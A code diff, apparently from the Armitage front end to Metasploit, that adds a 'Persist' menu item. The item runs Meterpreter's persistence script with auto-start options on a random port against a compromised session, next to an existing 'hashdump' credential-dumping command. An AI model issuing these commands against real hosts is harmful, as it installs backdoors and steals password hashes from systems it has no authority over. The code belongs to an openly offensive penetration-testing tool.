@@ -170,10 +170,14 @@ sub showMeterpreterMenu {
 			m_cmd($sid, "hashdump");
 		}, $sid => "$sid"));
 
-		#item($j, "Run Persistence", 'R', lambda({
-		#	oneTimeShow("run");
-		#	m_cmd($sid, "run persistence");
-		#}, $sid => "$sid"));
+		item($j, "Persist", 'P', lambda({
+			oneTimeShow("run");
+			local('$port');
+			$port = randomPort();
+			elog("ran persistence on " . sessionToHost($sid) . " ( $+ $port $+ )");
+			warn("ran persistence on " . sessionToHost($sid) . " ( $+ $port $+ )");
+			m_cmd($sid, "run persistence -S -U -i 5 -A -p $port");
+		}, $sid => "$sid"));
 	}
 			
 	$j = menu($1, "Interact", 'I');
